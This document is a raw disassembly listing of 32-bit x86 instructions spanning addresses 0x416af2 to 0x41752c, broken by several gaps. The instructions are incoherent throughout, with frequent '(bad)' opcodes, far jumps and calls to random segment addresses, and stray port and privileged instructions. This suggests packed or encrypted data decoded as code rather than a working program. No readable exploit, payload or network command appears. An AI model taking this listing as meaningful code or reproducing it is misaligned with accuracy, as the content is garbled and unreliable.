  416af2:	imul   edi,DWORD PTR [ecx],0x9856bcc5
  416af8:	xchg   ecx,eax
  416af9:	pop    es
  416afa:	fwait
  416afb:	mov    esi,0x1ad439ae
  416b00:	xchg   ebp,eax
  416b01:	daa    
  416b02:	popa   
  416b03:	rcl    ecx,cl
  416b05:	push   0xffffff86
  416b07:	aaa    
  416b08:	(bad)
  416b0b:	mov    esp,0x1751c54d
  416b10:	fcom   DWORD PTR [esi+0xf]
  416b13:	jae    0x416b02
  416b15:	jmp    0x316c03b0
  416b1a:	xchg   ebx,eax
  416b1b:	lods   eax,DWORD PTR ds:[esi]
  416b1c:	pop    edx
  416b1d:	add    DWORD PTR [ebx-0x34ee665f],eax
  416b23:	xchg   edx,eax
  416b24:	mov    dl,0xa7
  416b26:	mov    edi,0xcf0ba574
  416b2b:	pop    ds
  416b2c:	xor    BYTE PTR [edi+0x42],bh
  416b2f:	retf   0xf703
  416b32:	loope  0x416b07
  416b34:	rol    BYTE PTR [eax],1
	...
  416b96:	jecxz  0x416bfd
  416b98:	push   cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0xbba56b6b
  416ba3:	sahf   
  416ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ba5:	pop    es
  416ba6:	mov    edi,0x70000ed
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    BYTE PTR [esp-0x6c8568ac],dl
  416bb4:	ins    DWORD PTR es:[edi],dx
  416bb5:	mov    esi,0x4c59da27
  416bba:	mov    ebp,0xe9f662a4
  416bbf:	daa    
  416bc0:	xchg   esp,eax
  416bc1:	(bad)
  416bc4:	adc    eax,0x9db647fd
  416bc9:	loope  0x416bef
  416bcb:	test   BYTE PTR [ebp-0x5c],dh
  416bce:	mov    ah,0xa3
  416bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bd1:	and    esi,esi
  416bd3:	jmp    0x98e8:0x1108a896
  416bda:	aad    0x1f
  416bdc:	ret    
  416bdd:	int    0x4
  416bdf:	xor    DWORD PTR [esi+0x17a044fc],eax
  416be5:	pop    es
  416be6:	std    
  416be7:	or     eax,0x15806a76
  416bec:	lock cmp eax,0xb9d9a415
  416bf2:	repz dec eax
  416bf4:	imul   ebp,DWORD PTR ds:0xa7440e78,0xc4a7ce0c
  416bfe:	mov    ebx,0x55c1604a
  416c03:	fisubr WORD PTR [edx+0x40]
  416c06:	xor    DWORD PTR [edi+0x7],edi
  416c09:	into   
  416c0a:	xchg   BYTE PTR [ebp-0x5e4d3ce2],dl
  416c10:	sahf   
  416c11:	neg    DWORD PTR [ebx]
  416c13:	jmp    0xe0dc:0x52cec2c1
  416c1a:	or     al,0x6e
  416c1c:	dec    esp
  416c1d:	inc    edi
  416c1e:	ss call 0x39e44841
  416c24:	xchg   esi,eax
  416c25:	mov    eax,ds:0xc514b80
  416c2a:	int3   
  416c2b:	adc    esp,DWORD PTR [ebx+0xc]
  416c2e:	pop    esp
  416c2f:	in     eax,dx
  416c30:	mov    bh,0x79
  416c32:	dec    edi
  416c33:	test   BYTE PTR [eax],bh
  416c35:	jle    0x416c34
  416c37:	pop    eax
  416c38:	and    al,0xbe
  416c3a:	push   esp
  416c3b:	xchg   edx,eax
  416c3c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  416c3e:	test   DWORD PTR [ebp-0x5734c1e],eax
  416c44:	dec    edx
  416c45:	je     0x416cbc
  416c47:	je     0x416c51
  416c49:	fyl2xp1 
  416c4b:	jg     0x416c5d
  416c4d:	(bad)  
  416c4f:	loop   0x416c6b
  416c51:	xchg   esp,eax
  416c52:	sti    
  416c53:	jne    0x416bf9
  416c55:	xchg   ebx,eax
  416c56:	sub    BYTE PTR [edi+0x53],cl
  416c59:	mov    ebp,0x5dc408c2
  416c5e:	push   cs
  416c5f:	sbb    BYTE PTR [esi+0x78],bl
  416c62:	dec    ecx
  416c63:	cmp    al,0xb9
  416c65:	out    dx,eax
  416c66:	sahf   
  416c67:	fs mov edi,0x40f28883
  416c6d:	ret    
  416c6e:	mov    edi,0xe70dfd65
  416c73:	outs   dx,BYTE PTR gs:[esi]
  416c75:	and    eax,0x220bffda
  416c7a:	xor    ebp,DWORD PTR [esi-0x3f5b9e57]
  416c80:	loopne 0x416cf2
  416c82:	stc    
  416c83:	jae    0x416c78
  416c85:	iret   
  416c86:	into   
  416c87:	mov    ds:0x11b06d9b,al
  416c8c:	mov    dh,0xcb
  416c8e:	outs   dx,BYTE PTR ds:[esi]
  416c8f:	scas   eax,DWORD PTR es:[edi]
  416c90:	fcom   DWORD PTR [ecx-0x77184d8]
  416c96:	push   esp
  416c97:	xchg   ebx,eax
  416c98:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c9b:	mov    BYTE PTR [edi],dh
  416c9d:	mov    eax,0x83c13899
  416ca2:	clc    
  416ca3:	test   BYTE PTR [eax+0x5],dl
  416ca6:	sub    ecx,0x25
  416ca9:	cmp    esi,DWORD PTR [eax]
  416cab:	outs   dx,BYTE PTR ds:[esi]
  416cac:	sti    
  416cad:	xchg   edx,eax
  416cae:	xchg   ebx,eax
  416caf:	adc    DWORD PTR [esi],0xffffffa3
  416cb2:	adc    ebp,DWORD PTR [edi+0xdf]
	...
  416d14:	add    BYTE PTR [eax],al
  416d16:	and    DWORD PTR [ebx-0x40445077],edx
  416d1c:	daa    
  416d1d:	lahf   
  416d1e:	or     DWORD PTR ds:0xe05a80c9,edi
  416d24:	push   ebp
  416d25:	xchg   edx,eax
  416d26:	(bad)  
  416d27:	out    dx,al
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    dl,dh
  416d2f:	ja     0x416d1e
  416d31:	and    BYTE PTR ds:0xc1b783db,0xe9
  416d38:	loop   0x416d5c
  416d3a:	das    
  416d3b:	push   ebx
  416d3c:	add    esp,DWORD PTR [ebx]
  416d3e:	mov    dh,0x6e
  416d40:	adc    BYTE PTR [ebx],bl
  416d42:	sub    BYTE PTR [esi+ebx*4+0x6ba5ce2a],ch
  416d49:	pushf  
  416d4a:	pop    ecx
  416d4b:	(bad)  
  416d4c:	out    dx,al
  416d4d:	pop    ecx
  416d4e:	pop    esi
  416d4f:	and    BYTE PTR [ebx+0x8],dl
  416d52:	mov    dl,0x1
  416d54:	out    0xcc,eax
  416d56:	call   0x67dd3e8b
  416d5b:	jns    0x416d0d
  416d5d:	push   ebx
  416d5e:	das    
  416d5f:	lock mov ds,WORD PTR [ebx]
  416d62:	call   0x9e02e7f8
  416d67:	rcr    DWORD PTR [eax-0x77cbb939],0x46
  416d6e:	loopne 0x416d52
  416d70:	jge    0x416d32
  416d72:	mov    edi,0xf37598e9
  416d77:	(bad)  
  416d78:	and    DWORD PTR [eax-0x7a1e8248],eax
  416d7e:	mov    esp,0xc7da14ac
  416d83:	imul   eax,DWORD PTR [ebx+0x61],0xfbebfd45
  416d8a:	mov    ecx,0x6032741
  416d8f:	and    BYTE PTR [edi+ebx*4-0x15],al
  416d93:	push   ecx
  416d94:	out    0x1c,eax
  416d96:	sbb    ebx,DWORD PTR [esi-0x71]
  416d99:	cdq    
  416d9a:	pusha  
  416d9b:	std    
  416d9c:	enter  0x3621,0xfd
  416da0:	pop    ebp
  416da1:	xor    edx,DWORD PTR [ebp-0x12c49895]
  416da7:	repz fiadd DWORD PTR [esi+eiz*8]
  416dab:	test   al,0x6c
  416dad:	into   
  416dae:	adc    edi,DWORD PTR [ebp+0x54b5be6d]
  416db4:	cmc    
  416db5:	in     al,dx
  416db6:	pop    ebp
  416db7:	sbb    eax,esi
  416db9:	aam    0x98
  416dbb:	ss pop ss
  416dbd:	sbb    esp,ebp
  416dbf:	sub    eax,DWORD PTR [eax-0x27]
  416dc2:	add    edx,DWORD PTR [eax-0x5b0b5ce1]
  416dc8:	push   ss
  416dc9:	sti    
  416dca:	sbb    cl,BYTE PTR [ecx+ebp*8]
  416dcd:	pusha  
  416dce:	mov    WORD PTR [ecx],?
  416dd0:	out    dx,al
  416dd1:	scas   al,BYTE PTR es:[edi]
  416dd2:	lahf   
  416dd3:	push   esi
  416dd5:	xchg   esi,eax
  416dd6:	loopne 0x416dbe
  416dd8:	xchg   DWORD PTR [ebx+ebp*1-0x5a21f460],edi
  416ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de0:	sub    BYTE PTR [ebp-0x69],ah
  416de3:	jno    0x416ddf
  416de5:	dec    ecx
  416de6:	adc    ebp,esp
  416de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416de9:	sub    DWORD PTR [edi+0x5c3e8333],esi
  416def:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416df0:	or     esp,DWORD PTR [eax-0x14cb3e75]
  416df6:	fucomi st,st(1)
  416df8:	addr16 pop edx
  416dfa:	test   al,0x88
  416dfc:	mov    cl,BYTE PTR [ecx]
  416dfe:	sub    al,0xeb
  416e00:	mov    dh,0x52
  416e02:	mov    ah,0x91
  416e04:	pop    ebx
  416e05:	jbe    0x416dd4
  416e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e08:	xlat   BYTE PTR ds:[ebx]
  416e09:	cmp    BYTE PTR [ebp-0x736c9c31],dl
  416e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e10:	imul   esp,DWORD PTR [edx+0x28ad3e60],0x7f
  416e17:	mov    esp,0xddb4972a
  416e1c:	int    0x7c
  416e1e:	mov    eax,ds:0xe2ee0c33
  416e23:	imul   esp,DWORD PTR [edx+0x2d],0x47
  416e27:	adc    BYTE PTR ss:[esi-0x16],bh
  416e2b:	mov    ebp,0x6bea5c02
  416e30:	(bad)  
  416e31:	cmp    eax,0x85c741
	...
  416e96:	mov    edi,0xae6d8e19
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8-0x7ed8c876]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    BYTE PTR [ecx+0x7378d376],cl
  416eb3:	fisttp WORD PTR [eax]
  416eb5:	test   al,0x8d
  416eb8:	lods   al,BYTE PTR ds:[esi]
  416eb9:	aam    0x93
  416ebb:	cwde   
  416ebc:	mov    ebx,0xdc6d81cb
  416ec1:	fist   WORD PTR [eax]
  416ec3:	stos   BYTE PTR es:[edi],al
  416ec4:	dec    ebx
  416ec5:	cmc    
  416ec6:	jo     0x416ec9
  416ec8:	cwde   
  416ec9:	lea    edi,[eax+0x2c]
  416ecc:	mov    esp,0x9e83715
  416ed1:	ja     0x416e61
  416ed3:	rcr    BYTE PTR [edx+0x2f],1
  416ed6:	xchg   edx,eax
  416ed7:	xor    al,0x6d
  416ed9:	inc    ecx
  416eda:	ret    
  416edb:	or     al,0x88
  416edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ede:	and    dl,dh
  416ee0:	shr    DWORD PTR [ebx-0x11a3035f],1
  416ee6:	loope  0x416e69
  416ee8:	repz and eax,0x8c154957
  416eee:	(bad)  
  416eef:	jno    0x416eab
  416ef1:	sub    eax,0xd598819d
  416ef6:	jnp    0x416f04
  416ef8:	ins    BYTE PTR es:[edi],dx
  416ef9:	dec    esi
  416efa:	shl    DWORD PTR [ebx],0x7a
  416efd:	fld    TBYTE PTR [eax+edi*4]
  416f00:	aad    0xd
  416f02:	and    ecx,DWORD PTR [ecx-0x60e6049]
  416f08:	ror    edx,cl
  416f0a:	add    esi,DWORD PTR [ebx-0x96bbd57]
  416f10:	mov    al,0x22
  416f12:	pop    eax
  416f13:	ret    0x7e19
  416f16:	(bad)  
  416f17:	pushf  
  416f18:	mov    cs,WORD PTR [edi+0x78]
  416f1b:	add    DWORD PTR [ebx-0xb],esp
  416f1e:	gs push ebx
  416f20:	in     eax,dx
  416f21:	loope  0x416f4c
  416f23:	loop   0x416f8c
  416f25:	rol    DWORD PTR [ebx+0x45],cl
  416f28:	add    eax,0xe006eda3
  416f2d:	sbb    al,0x81
  416f2f:	pop    ebp
  416f30:	lods   al,BYTE PTR ds:[esi]
  416f31:	sub    cl,BYTE PTR [ecx]
  416f33:	pop    esi
  416f34:	aaa    
  416f35:	push   edx
  416f36:	imul   esp,DWORD PTR [esi-0x1e],0xee891eb5
  416f3d:	xchg   BYTE PTR [eax-0x67],bl
  416f40:	enter  0x6003,0x54
  416f44:	jg     0x416f85
  416f46:	xchg   edx,eax
  416f47:	jecxz  0x416ede
  416f49:	jmp    0x416fc7
  416f4b:	pushf  
  416f4c:	push   edi
  416f4d:	fst    st(0)
  416f4f:	adc    ebp,esp
  416f51:	inc    ebp
  416f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f53:	repz retf 0x176
  416f57:	xchg   BYTE PTR [ecx-0x25],bh
  416f5a:	xor    al,0x13
  416f5c:	pop    eax
  416f5d:	pop    ebp
  416f5e:	add    dl,al
  416f60:	test   BYTE PTR [ecx-0x2942c5f0],ah
  416f66:	pop    ecx
  416f67:	loop   0x416fe7
  416f69:	dec    edi
  416f6a:	mov    ds,WORD PTR [esi]
  416f6c:	cmc    
  416f6d:	cmp    edi,ebx
  416f6f:	sbb    al,0x4c
  416f71:	stos   DWORD PTR es:[edi],eax
  416f72:	or     bl,BYTE PTR [ecx+0x27613e01]
  416f78:	pop    ebp
  416f79:	cs pop ds
  416f7b:	cmp    DWORD PTR [ecx],ebx
  416f7d:	test   al,0xbd
  416f7f:	or     eax,0xdf75ed9a
  416f84:	shr    ah,1
  416f86:	les    edi,FWORD PTR [ebx+ebp*1]
  416f89:	sbb    eax,0x3e4037cd
  416f8e:	not    esp
  416f90:	jmp    0xe14d:0x9ec56fd9
  416f97:	mov    ebp,0x5f654ee7
  416f9c:	inc    esp
  416f9d:	lahf   
  416f9e:	mov    eax,0x780b6f75
  416fa3:	sub    eax,0x2c6ae8ea
  416fa8:	push   esi
  416fa9:	icebp  
  416faa:	or     edx,DWORD PTR [edi+0x3d]
  416fad:	jmp    0x416fc9
  416faf:	into   
  416fb0:	test   DWORD PTR [edx+0x358126],esp
	...
  417016:	jbe    0x417045
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	in     eax,dx
  417023:	sbb    al,0x46
  417025:	inc    esp
  417026:	aam    0xf0
  417028:	add    BYTE PTR [eax],al
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    ah,bl
  41702f:	mov    ah,0x2c
  417031:	sahf   
  417032:	push   esp
  417033:	xchg   edi,eax
  417034:	jb     0x417079
  417036:	xor    DWORD PTR [ecx-0x66c47d3f],ecx
  41703c:	fwait
  41703d:	dec    esp
  41703e:	les    edi,FWORD PTR [eax]
  417040:	es inc ebp
  417042:	stos   DWORD PTR es:[edi],eax
  417043:	lea    ebp,[ecx+edx*8-0x1d]
  417047:	ss sbb eax,0x7477516f
  41704d:	inc    esp
  41704e:	mov    esi,fs
  417050:	pop    edx
  417051:	popa   
  417052:	inc    edx
  417053:	mov    eax,DWORD PTR [edx]
  417055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417056:	cmp    BYTE PTR [ebx+0x457e6942],ah
  41705c:	scas   al,BYTE PTR es:[edi]
  41705d:	mov    bl,0x63
  41705f:	das    
  417060:	aaa    
  417061:	cmp    dh,BYTE PTR [ebx+eiz*8+0x2f]
  417065:	fimul  DWORD PTR [edi+edi*2-0x50816ebd]
  41706c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41706d:	mov    edi,0xc97b4613
  417072:	push   ebx
  417073:	dec    ebp
  417074:	xchg   ecx,eax
  417075:	pop    eax
  417076:	ds or  ch,cl
  417079:	ror    eax,cl
  41707b:	inc    ebp
  41707c:	out    0x27,eax
  41707e:	xor    BYTE PTR [edx-0x43ef4d0a],ch
  417084:	call   0x9466a515
  417089:	mov    eax,ds:0x3824a19c
  41708e:	(bad)  
  417090:	rol    BYTE PTR [ebx+0x2c],0x1d
  417094:	push   eax
  417095:	mov    dl,bl
  417097:	adc    BYTE PTR ds:0x200d2d9b,ah
  41709d:	and    al,0xe0
  41709f:	loopne 0x41707e
  4170a1:	imul   eax,esp,0xf53b0a51
  4170a7:	jbe    0x417110
  4170a9:	outs   dx,DWORD PTR ds:[esi]
  4170aa:	mov    ?,WORD PTR [ebx+0x14f4ceea]
  4170b0:	cmc    
  4170b1:	dec    ebp
  4170b2:	jne    0x4170ed
  4170b4:	mov    bh,0x1
  4170b6:	bound  esp,QWORD PTR [ebx+0x19077d33]
  4170bc:	sbb    ebp,esp
  4170be:	jge    0x417095
  4170c0:	xlat   BYTE PTR ds:[ebx]
  4170c1:	pop    esi
  4170c2:	xchg   ecx,eax
  4170c3:	or     ebp,eax
  4170c5:	ficomp DWORD PTR [edx+ebx*1+0x3617bded]
  4170cc:	loope  0x4170b4
  4170ce:	out    0xca,eax
  4170d0:	bound  ebp,QWORD PTR [eax-0x38]
  4170d3:	pushf  
  4170d4:	lods   eax,DWORD PTR ds:[esi]
  4170d5:	and    BYTE PTR [eax+0xe],cl
  4170d8:	mov    dh,BYTE PTR [ebp-0x23e221cb]
  4170de:	scas   eax,DWORD PTR es:[edi]
  4170df:	fdiv   QWORD PTR [ecx+0x26710704]
  4170e5:	inc    eax
  4170e6:	pusha  
  4170e7:	nop
  4170e8:	(bad)  
  4170e9:	out    dx,eax
  4170ea:	jae    0x417076
  4170ec:	xor    bh,BYTE PTR [edx+0x609ba108]
  4170f2:	jle    0x4170d9
  4170f4:	mov    ?,WORD PTR [ebx]
  4170f6:	sar    bl,1
  4170f8:	lods   eax,DWORD PTR ds:[esi]
  4170f9:	xchg   ebx,eax
  4170fa:	xchg   ebp,eax
  4170fb:	xchg   esi,eax
  4170fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170fd:	mov    bl,0x2f
  4170ff:	fiadd  WORD PTR [esi-0x789932f4]
  417105:	xor    esp,DWORD PTR [edx-0x7e90d298]
  41710b:	lods   al,BYTE PTR ds:[esi]
  41710c:	dec    esi
  41710d:	pop    esi
  41710e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41710f:	mov    edx,fs
  417111:	lock fcmovne st,st(0)
  417114:	xchg   edi,ecx
  417116:	jg     0x41717b
  417118:	es (bad) 
  41711a:	mov    bh,0xad
  41711c:	sahf   
  41711d:	pop    edx
  41711e:	in     eax,0x49
  417120:	in     al,dx
  417121:	sahf   
  417122:	aaa    
  417123:	mov    ch,0xd4
  417125:	int3   
  417126:	nop
  417127:	ins    DWORD PTR es:[edi],dx
  417128:	sub    al,0xe1
  41712a:	pushf  
  41712b:	sbb    BYTE PTR [edx+0x5d02ab45],ah
  417131:	fistp  QWORD PTR [ecx+0xa91]
	...
  417193:	add    BYTE PTR [eax],al
  417195:	add    BYTE PTR [esi-0xe58fe7],ah
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	cmc    
  4171a3:	mov    eax,ds:0xf1dbd06a
  4171a8:	add    BYTE PTR [eax],al
  4171aa:	pop    es
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [esi],dl
  4171af:	(bad)  
  4171b0:	imul   ch
  4171b2:	loop   0x417168
  4171b4:	es or  al,0xfd
  4171b7:	test   BYTE PTR fs:[ebx-0x62],bl
  4171bb:	adc    ebp,DWORD PTR [edx-0x6ef31cd0]
  4171c1:	xor    BYTE PTR [ecx],al
  4171c3:	and    DWORD PTR [ecx+0x33],esi
  4171c6:	lds    ebx,FWORD PTR [ebx*4+0x1cfea24a]
  4171cd:	or     eax,0x5c74bddf
  4171d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171d3:	xor    BYTE PTR [ebx],0xe3
  4171d6:	jnp    0x4171af
  4171d8:	mov    ds:0x97a52b2a,al
  4171dd:	(bad)  
  4171de:	jmp    0x5bc1600e
  4171e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171e4:	sbb    ebp,DWORD PTR ds:0x4f423ba9
  4171ea:	mov    cl,0xdd
  4171ec:	mov    bl,0xd6
  4171ee:	jae    0x4171ed
  4171f0:	xchg   DWORD PTR [eax],esi
  4171f2:	inc    ecx
  4171f3:	mov    ds:0xa6547026,al
  4171f8:	sbb    BYTE PTR [eax],ah
  4171fa:	call   0x354e:0xd4e9ca
  417201:	add    ebx,ebp
  417203:	retf   0x270c
  417206:	pop    es
  417207:	aad    0x23
  417209:	sub    ebx,DWORD PTR [eax]
  41720b:	outs   dx,DWORD PTR ds:[esi]
  41720c:	fisubr DWORD PTR [edx-0x698da108]
  417212:	fcom   DWORD PTR [ebx+ebp*8+0x200cb3ec]
  417219:	mov    DWORD PTR [ebp+0x19],esp
  41721c:	std    
  41721d:	and    eax,0x890c47a8
  417222:	aas    
  417223:	ror    ch,cl
  417225:	repz add DWORD PTR [esi-0x2ef5418f],ebp
  41722c:	call   0xeb76:0x4f9ad3c0
  417233:	mov    DWORD PTR [esi],edi
  417235:	xchg   esp,eax
  417236:	pop    ss
  417237:	dec    ecx
  417238:	mov    BYTE PTR [esi-0x5a2460b8],bl
  41723e:	and    eax,0x7665e371
  417243:	popf   
  417244:	cmc    
  417245:	push   cs
  417246:	mov    cl,0xb1
  417248:	xor    edx,DWORD PTR [edx]
  41724a:	dec    ecx
  41724b:	js     0x4171f3
  41724d:	inc    eax
  41724e:	mov    WORD PTR [ebx],gs
  417250:	popa   
  417251:	pop    edx
  417252:	call   DWORD PTR [edi]
  417254:	fdivr  QWORD PTR ds:0x8a3cbed3
  41725a:	push   ebp
  41725b:	push   es
  41725c:	out    0x5a,eax
  41725e:	mov    al,0x55
  417260:	(bad)  
  417261:	push   ecx
  417262:	lock fnsave fs:[ebp+edi*1-0x51a16b0e]
  41726b:	loopne 0x4172e7
  41726d:	jmp    0xf980:0x3fb4fc56
  417274:	in     al,dx
  417275:	(bad)  
  417276:	je     0x4172b2
  417278:	cld    
  417279:	pop    esp
  41727a:	xchg   esp,eax
  41727b:	sub    al,0x91
  41727d:	jg     0x4172eb
  41727f:	or     al,0x66
  417281:	mov    al,ds:0x7f7377a5
  417286:	pop    eax
  417287:	jno    0x417298
  417289:	mov    dl,0x28
  41728b:	push   ecx
  41728c:	mov    bh,0x5a
  41728e:	scas   al,BYTE PTR es:[edi]
  41728f:	nop
  417290:	outs   dx,DWORD PTR ds:[esi]
  417291:	sub    al,0x98
  417293:	dec    ebp
  417294:	push   ebx
  417295:	xor    BYTE PTR [ecx+0x7d],cl
  417298:	jo     0x4172b0
  41729a:	adc    eax,0xb5f75ea8
  41729f:	ret    0x4bdb
  4172a2:	mov    ah,0x1a
  4172a4:	loope  0x41731f
  4172a6:	ins    BYTE PTR es:[edi],dx
  4172a7:	pop    esi
  4172a8:	xor    BYTE PTR [edi+0x26fb8dc5],bl
  4172ae:	jecxz  0x4172c4
  4172b0:	mov    eax,ds:0x6851d1a2
	...
  417315:	add    BYTE PTR [ecx-0x44],ch
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	pop    esi
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	jg     0x417306
  41731d:	mov    edi,0x85e5bf4a
  417322:	pop    ds
  417323:	fnsave [eax-0x7d]
  417326:	loop   0x41731a
  417328:	add    BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    BYTE PTR [esi-0x26],bh
  417330:	dec    edx
  417331:	imul   ebx,DWORD PTR [ecx+0x6496ebab],0x35
  417338:	mov    ebx,0x35d8b014
  41733d:	(bad)  
  41733e:	mov    esp,0xd09de636
  417343:	fwait
  417344:	stos   DWORD PTR es:[edi],eax
  417345:	cwde   
  417346:	xor    DWORD PTR [eax+0xd86a2c1],edi
  41734c:	ret    0x228a
  41734f:	dec    esp
  417350:	push   0x4ec6ef17
  417355:	cmp    cl,bh
  417357:	inc    ebp
  417358:	and    eax,0x3b8d2519
  41735d:	enter  0x5cb8,0x70
  417361:	(bad)  [ebx-0x55032b1f]
  417367:	pop    es
  417368:	(bad)  
  417369:	fs mov bl,0xde
  41736c:	popf   
  41736d:	iret   
  41736e:	ror    BYTE PTR [ebx+0x74cbb60b],0xaf
  417375:	lods   al,BYTE PTR ds:[esi]
  417376:	pop    ebx
  417377:	jns    0x417320
  417379:	loop   0x417308
  41737b:	xor    al,0x9d
  41737d:	xchg   ebx,esp
  41737f:	mov    dh,0x52
  417381:	pop    ecx
  417382:	in     eax,dx
  417383:	xchg   edi,eax
  417384:	mov    bh,0x20
  417386:	in     al,dx
  417387:	test   al,0xa7
  417389:	imul   esp,DWORD PTR [ebx],0x4c
  41738c:	and    DWORD PTR [ebp+0x1232684a],ecx
  417392:	mov    ah,0xca
  417394:	fst    DWORD PTR [eax*2+0xd25ffc8]
  41739b:	cwde   
  41739c:	mov    BYTE PTR [ebp-0x5f],ah
  41739f:	mov    ds:0x3c5f7397,al
  4173a4:	pusha  
  4173a5:	push   edi
  4173a6:	jae    0x417411
  4173a8:	imul   esp,DWORD PTR [edi],0xffffffcf
  4173ab:	sub    dh,ch
  4173ad:	inc    ecx
  4173ae:	sub    eax,0x89f439f
  4173b3:	in     al,dx
  4173b4:	cmc    
  4173b5:	inc    ecx
  4173b6:	outs   dx,DWORD PTR ds:[esi]
  4173b7:	mov    eax,0x15787cf7
  4173bc:	stos   BYTE PTR es:[edi],al
  4173bd:	test   DWORD PTR [edi],ebp
  4173bf:	idiv   DWORD PTR [eax+0x32]
  4173c2:	sbb    dh,al
  4173c4:	jg     0x4173cb
  4173c6:	mov    esi,0x34b4f412
  4173cb:	(bad)  
  4173cc:	jmp    0x5c6:0xabecf404
  4173d3:	aad    0x2a
  4173d5:	dec    edx
  4173d6:	push   es
  4173d7:	mov    al,ch
  4173d9:	les    ebx,FWORD PTR [esi]
  4173db:	imul   ebx,DWORD PTR [ebx-0x5e4a5f00],0x8cdb0904
  4173e5:	ret    0x28fb
  4173e8:	cmc    
  4173e9:	sbb    al,0x1c
  4173eb:	and    ch,BYTE PTR [esi+0x1d]
  4173ee:	jg     0x417420
  4173f0:	js     0x4173a8
  4173f2:	xchg   esi,eax
  4173f3:	push   ebx
  4173f4:	retf   0x56ab
  4173f7:	push   cs
  4173f8:	xor    al,0x82
  4173fa:	cmp    dh,BYTE PTR [ecx]
  4173fc:	call   0x27a7:0xe7d9d9e3
  417403:	push   ebx
  417404:	inc    eax
  417405:	sbb    bl,BYTE PTR [ebx+0x6d55b937]
  41740b:	out    0x8f,eax
  41740d:	mov    cl,0x4d
  41740f:	adc    eax,0x32d2563e
  417414:	xchg   edi,eax
  417415:	std    
  417416:	adc    eax,0x1de61393
  41741b:	leave  
  41741c:	pop    es
  41741d:	jle    0x41743b
  41741f:	xchg   esi,eax
  417420:	call   0x99f6:0x90e8950e
  417427:	ficom  WORD PTR [eax+ebx*8-0x4ae659c0]
  41742e:	(bad)  
  41742f:	jecxz  0x41742e
  417431:	(bad)  
  417433:	mov    edi,0x21
	...
  417494:	add    BYTE PTR [eax],al
  417496:	xchg   ecx,eax
  417497:	mov    edx,0xdc6b0c6a
  41749c:	idiv   DWORD PTR [edi+0x6bda61d2]
  4174a2:	inc    esi
  4174a3:	dec    esi
  4174a4:	leave  
  4174a5:	test   cl,ch
  4174a7:	repz add BYTE PTR [eax],al
  4174aa:	pop    es
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    BYTE PTR ds:0xbd63f78a,dl
  4174b3:	mov    ds:0x2e4e9aaa,eax
  4174b8:	hlt    
  4174b9:	pop    ecx
  4174ba:	fbld   TBYTE PTR [ebx-0x76]
  4174bd:	stc    
  4174be:	lods   al,BYTE PTR ds:[esi]
  4174bf:	jo     0x41744a
  4174c1:	or     bl,BYTE PTR [eax-0x73]
  4174c4:	dec    esp
  4174c5:	mov    ecx,0x6af81042
  4174ca:	add    edi,edx
  4174cc:	adc    eax,0x165bc079
  4174d1:	and    BYTE PTR [eax+ebx*4],0x67
  4174d5:	pop    ebp
  4174d6:	xchg   ebp,eax
  4174d7:	(bad)  
  4174d8:	cld    
  4174d9:	pop    ecx
  4174da:	in     eax,0xe4
  4174dc:	das    
  4174dd:	shl    DWORD PTR [ecx+ebx*8+0x44],0x10
  4174e2:	xor    eax,0x4a010e83
  4174e7:	leave  
  4174e8:	lahf   
  4174e9:	mov    ecx,ecx
  4174eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ec:	inc    ebp
  4174ed:	sbb    bh,bl
  4174ef:	rol    DWORD PTR [eax+0x60d9cd17],1
  4174f5:	daa    
  4174f6:	loopne 0x4174f8
  4174f8:	push   es
  4174f9:	and    bh,BYTE PTR [eax+0x16]
  4174fc:	shr    BYTE PTR ds:0x61de0347,1
  417502:	rcl    BYTE PTR [ebp+0x68],0xd6
  417506:	sbb    edx,DWORD PTR [esi]
  417508:	cdq    
  417509:	out    0x28,al
  41750b:	jmp    0x70be94b6
  417510:	ret    0xd638
  417513:	sub    BYTE PTR [ecx],0xfe
  417516:	in     eax,dx
  417517:	pop    ss
  417518:	cmp    BYTE PTR [edi-0x34],0x22
  41751c:	sbb    BYTE PTR [eax+0x64955138],al
  417522:	mov    dh,0x84
  417524:	retf   
  417525:	sbb    BYTE PTR [edi-0x6ac0ebd3],0x6c
  41752c:	or     DWORD PTR [edi-0x18],ebx
